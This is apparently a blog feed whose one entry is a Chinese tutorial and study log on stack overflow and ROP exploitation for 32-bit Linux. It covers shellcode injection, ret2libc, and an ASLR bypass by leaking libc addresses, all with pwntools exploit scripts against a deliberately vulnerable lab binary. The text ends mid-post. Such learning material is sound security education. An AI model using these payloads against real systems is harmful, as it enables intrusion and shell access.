<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sunqiz&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-08-13T07:53:08.705Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Sunqiz</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一步一步学ROP之linux_x86学习</title>
    <link href="http://example.com/2021/08/13/%E8%92%B8%E7%B1%B3ROP_linux_X86/"/>
    <id>http://example.com/2021/08/13/%E8%92%B8%E7%B1%B3ROP_linux_X86/</id>
    <published>2021-08-13T11:39:43.686Z</published>
    <updated>2021-08-13T07:53:08.705Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一步一步学ROP之linux-x86学习"><a href="#一步一步学ROP之linux-x86学习" class="headerlink" title="一步一步学ROP之linux_x86学习"></a>一步一步学ROP之linux_x86学习</h1><p>学习网址：</p><p><a href="https://www.tuicool.com/articles/ZruA7bZ">https://www.tuicool.com/articles/ZruA7bZ</a></p><p><a href="https://www.yuque.com/hxfqg9/bin/zzg02e#qnw71">https://www.yuque.com/hxfqg9/bin/zzg02e#qnw71</a></p><h2 id="先来个什么防御都没有的"><a href="#先来个什么防御都没有的" class="headerlink" title="先来个什么防御都没有的"></a>先来个什么防御都没有的</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">vulnerable_function();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为read函数读入256个字节 而buf只有128个字节，有明显缓冲区溢出</p><p>使用命令进行编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ubuntu中</span><br><span class="line"></span><br><span class="line">gcc -m32 -g -fno-stack-protector -z execstack -o level1 level1.c</span><br><span class="line"></span><br><span class="line">kali中</span><br><span class="line"></span><br><span class="line">gcc -m32 -g -fno-stack-protector -no-pie -z execstack -o level1 level1.c</span><br><span class="line"></span><br><span class="line">不知道为啥kali中运行ubuntu中命令关不掉pie，就再gcc的时候关掉就好了</span><br></pre></td></tr></table></figure><p>-m32意思是编译为32位的程序</p><p>-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector -no-pie 关掉pie</p><p>再执行一下（需要root权限，sudo不好使，先su到root，执行完再exit）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>关掉系统的ASLR</p><p>用checksec查看一手</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ checksec level1</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/pwnstu/test1/level1&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以使用自己写或网上找的 pattern.py 生成数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">python pattern.py create 150</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure><p>也可以借助gdb-peda 中的pattern生成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> pattern create 150</span></span><br><span class="line">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&#x27;</span><br></pre></td></tr></table></figure><p>这里借助pattern.py生成数据，利用gdb调试程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./level1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>将生成的数据填入</p><p><code>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</code></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041150743.png" alt="image-20210804115038632"></p><p>发现了报错//程序接收到信号SIGSEGV(故障地址0x37654136)</p><p>说明我们的缓冲区溢出到了返回地址（可执行的指令那）</p><p>计算一下距离</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python pattern.py offset 0x37654136</span></span><br><span class="line">hex pattern decoded as: 6Ae7</span><br><span class="line">140</span><br></pre></td></tr></table></figure><p>那我们需要覆盖的点就是140个字节，那就是整个栈的大小</p><p>[填充字符]+[ret字符串]就可以让pc执行ret地址上的代码了</p><p>[填充字符] =&gt; [shellcode……AAAAAAAAAAAAAA……]</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041549532.png" alt="image-20210804154955466"></p><p>也就是我们找到填充的字符串开始的地方，把0x37654136那一块的地址改成找到的地址，把字符串开头写成shellcode就能反弹shell了</p><p>最简单就利用execve (“/bin/sh”) </p><p>那就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># xor ecx, ecx     #清空ecx寄存器，因为execve的函数ecx的值为0</span></span><br><span class="line"><span class="comment"># mul ecx</span></span><br><span class="line"><span class="comment"># push ecx</span></span><br><span class="line"><span class="comment"># push 0x68732f2f   #\x00hs/</span></span><br><span class="line"><span class="comment"># push 0x6e69622f   #nib/，小端模式需要反着压入栈中</span></span><br><span class="line"><span class="comment"># mov ebx, esp #将字符串的地址传递给ebx</span></span><br><span class="line"><span class="comment"># mov al, 11</span></span><br><span class="line"><span class="comment"># int 0x80#调用80中断</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure><p>溢出点有了，shellcode有了，下一步就是跳转到shellcode的地址上</p><p>查阅资料发现正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置，但是gdb的调试环境会影响buf在内存中的位置，我们直接运行./level1的时候，缓冲区buf会固定到其他地方</p><p>我们就需要用到core dump这个功能。开启了core dump之后，当出现内存错误的时候，系统会生成一个core dump文件，然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br></pre></td></tr></table></figure><p>就能再该文件夹下生成core dump文件</p><p>再运行一次程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./level1</span> </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>再利用core dumped文件对level1文件gdb调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdb level1 core</span><br></pre></td></tr></table></figure><p>溢出点是140个字节，再加上4个字节ret地址利用x/10s $esp-144查看shellcode地址</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041637567.png" alt="image-20210804163719516"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041635876.png" alt="image-20210804163513821"></p><p>那shellcode的地址就是0xffffcfe0</p><p>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">ret = <span class="number">0xffffcfe0</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line">payload = shellcode + <span class="string">&#x27;A&#x27;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041638310.png" alt="image-20210804163821270"></p><p>但是没成功。。。。</p><p>查阅了很多资料，但都不行，在思考中</p><p>利用gdb调试</p><p>发现</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041717690.png" alt="image-20210804171633239"></p><p>shellcode是都进去了，但是esp有不知道去哪了</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041725356.png" alt="image-20210804172552292"></p><p>栈里东西没错啊 esp也指向这里，我写的shellcode</p><p>接着一个和next命令，接着直接跳到</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041732483.png" alt="image-20210804173224417"></p><p>是我shellcode有问题🐎QAQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line">ret = <span class="number">0xffffcf80</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;xor ecx, ecx&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;mul ecx&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;push ecx&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;mul ecx&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;push 0x68732f2f&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;push 0x6e69622f&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;mov ebx, esp&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;mov al, 11&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;int 0x80&quot;</span>)</span><br><span class="line">payload =shellcode+ <span class="string">&#x27;A&#x27;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041816595.png" alt="image-20210804181632363"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041823036.png" alt="image-20210804182344977"></p><p>还不清楚什么原因QAQ</p><p>利用生成的报错core gdb调试得到正确的ret地址即可，但还是不清楚为什么原来的ret不行。</p><h2 id="通过ret2libc绕过DEP防护（栈不可执行）"><a href="#通过ret2libc绕过DEP防护（栈不可执行）" class="headerlink" title="通过ret2libc绕过DEP防护（栈不可执行）"></a>通过ret2libc绕过DEP防护（栈不可执行）</h2><p><a href="https://bbs.secgeeker.net/thread-1540-1-1.html">https://bbs.secgeeker.net/thread-1540-1-1.html</a></p><p>ret2libc是栈溢出漏洞利用的一种常见手段。通过控制函数执行libc中的函数，libc.so里保存了大量可利用的函数，通常我们利用其执行system(“/bin/sh”)</p><p><strong>libc 是 Linux 下的 ANSI C 函数库。是C语言最基本的库函数。可以把它理解为可执行程序的运行依赖</strong></p><p>linux下的动态链接是通过PLT&amp;GOT来实现的，动态链接每个函数需要</p><p>1.存放函数地址的数据段 2.获取数据段记录的外部函数地址的代码</p><p>用来存外部函数地址的数据表叫GOT表，存代码的叫PLT表</p><p><strong>libc 是 Linux 下的 ANSI C 函数库；glibc 是 Linux 下的 GUN C 函数库。</strong> </p><p><strong>libc 实际上是一个泛指。凡是符合实现了 C 标准规定的内容，都是一种 libc 。</strong><br><strong>glibc 是 GNU 组织对 libc 的一种实现。它是 unix/linux 的根基之一。</strong></p><p>glibc在/lib目录下的.so文件为libc.so.6,Linux下原来的标准c库Linux libc逐渐不再被维护</p><p>ANSI C 函数库是基本的 C 语言函数库，包含了 C 语言最基本的库函数。</p><p>这边借用一下师傅的图</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051206433.png" alt="image-20210805120645293"></p><p>想通过PLT表获得函数的地址，要保证GOT表有存他的正确地址，但是一开始所有函数重定位十分麻烦，linux就有了延迟绑定机制</p><h3 id="延迟绑定机制"><a href="#延迟绑定机制" class="headerlink" title="延迟绑定机制"></a>延迟绑定机制</h3><p>只有动态库的函数在被调用的时候才会地址解析和重定位。</p><p>地址解析和重定位相当当一个函数要被调用了，就会利用PTL表找到GOT表的内容，就可以跳转到正确的地址运行函数。</p><p>接着我们的进阶任务</p><p>使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -g -fno-stack-protector -o level2 level1.c</span><br></pre></td></tr></table></figure><p>生成我们的第二题</p><p>利用ret2libc控制函数的执行 libc 中的system(“/bin/sh”)</p><p>那现在就是得到system()这个函数的地址以及”/bin/sh”这个字符串的地址，system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。即使程序开启了 ASLR ，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p><p>用checksec看一看</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051521011.png" alt="image-20210805152105953"></p><p>再用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./level2</span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p>让程序将libc.so加载到内存中</p><p>因为我们关闭了ASLR，所以 system函数和”/bin/sh”字符串在内存中的地址是不会变化滴，通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print system</span><br><span class="line">find &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><p>得到system和”/bin/sh”的位置</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051523754.png" alt="image-20210805152351709"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xf7e3ddb0</span><br><span class="line">0xf7f5eb2b</span><br></pre></td></tr></table></figure><p>上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line">ret = <span class="number">0xdeadbeef</span></span><br><span class="line">systemaddr=<span class="number">0xf7e3ddb0</span></span><br><span class="line">binshaddr=<span class="number">0xf7f5eb2b</span></span><br><span class="line">payload =  <span class="string">&#x27;A&#x27;</span>*<span class="number">140</span> + p32(systemaddr) + p32(ret) + p32(binshaddr)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;level2ex.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>由于system执行完需要返回地址，然后再传”/bin/sh”的地址进入system中，那个返回地址没有使用，可以随便写</p><p>执行成功：</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051601044.png" alt="image-20210805160112990"></p><h2 id="绕过ASLR防护"><a href="#绕过ASLR防护" class="headerlink" title="绕过ASLR防护"></a>绕过ASLR防护</h2><p>把ASLR打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>再来看看libc的地址，利用ldd命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd level2</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051624220.png" alt="image-20210805162458153"></p><p>都不一样，原来的exp就用不了了</p><p>我们可以通过先泄露libc.so中的其他函数在内存中的地址，在计算那个其他函数到system函数和”/bin/sh”之间的距离进而求出system函数和”/bin/sh”真正的地址，之后再执行我们的ret2libc的shellcode。</p><p>先把libc文件copy过来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /lib32/libc.so.6 libc.so</span><br></pre></td></tr></table></figure><p>使用命令查看可以利用的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objdump -d -j .plt level2</span><br><span class="line">objdump -R level2</span><br><span class="line">objdump -d level2</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051715164.png" alt="image-20210805171525093"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051716180.png" alt="image-20210805171619133"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051923936.png" alt="image-20210805192330867"></p><p>得到vulnerable_function的地址为0x804843b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x804843b</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10003,fork EXEC:./level #可以开端口让remote连结</span><br></pre></td></tr></table></figure><p>p32、p64是打包为二进制，u32、u64是解包为二进制</p><p>recv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时</p><p>next(libc.search(‘/bin/sh’))返回’/bin/sh’字符串的位置</p><p><strong>结果不对，没拿到shell</strong></p><p>运行时加入注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;symbols[&#x27;write&#x27;] = &quot;</span> + <span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;plt_write= &#x27;</span> + <span class="built_in">hex</span>(plt_write)</span><br><span class="line"></span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;got_write= &#x27;</span> + <span class="built_in">hex</span>(got_write)</span><br><span class="line"></span><br><span class="line">vulfun_addr = <span class="number">0x804843b</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;write_addr= &#x27;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc.symbols[&#x27;</span>write<span class="string">&#x27;] = &#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;system&#x27;]= &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;next(libc.search(&#x27;/bin/sh&#x27;))= &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;write&#x27;] - libc.symbols[&#x27;system&#x27;] = &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;(libc.symbols[&#x27;write&#x27;] - next(libc.search(&#x27;/bin/sh&#x27;)))= &quot;</span> + <span class="built_in">hex</span>((libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr= &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr= &#x27;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061105390.png" alt="image-20210806110516325"></p><p>gdb调试报错后生成的core文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb level2 core</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061103008.png" alt="image-20210806110348928"></p><p>我的write溢出的没错</p><p>本地看看libc里的函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061107273.png" alt="image-20210806110706208"></p><p>确实没错啊</p><p>本地断个点计算一下</p><p><img 